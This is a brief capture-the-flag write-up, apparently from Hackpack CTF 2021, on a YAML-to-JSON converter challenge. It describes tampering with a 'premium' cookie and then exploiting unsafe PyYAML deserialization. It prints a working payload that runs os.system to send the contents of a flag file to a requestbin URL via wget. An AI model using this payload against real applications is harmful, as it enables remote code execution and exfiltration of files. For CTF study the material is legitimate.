page offers a simple conversion from .yaml to .json

website also created a cookie premium:false
it is possible to change false to true which show us a message that PyYaml library is being used. It seems that it has some arbitrary code executions vunerabilities. After some checking me and my team found that exploit to send a flag to requestbin

 ![](https://i.ibb.co/hdJ3Kpg/Screenshot-2021-04-17-Yaml-2-Json-Hackpack-CTF-2021.png)

```
{
	!!python/object/apply:os.system ["wget http://requestbin.net/r/1b9a6hxj/?`cat /tmp/flag.txt`"]
}

```
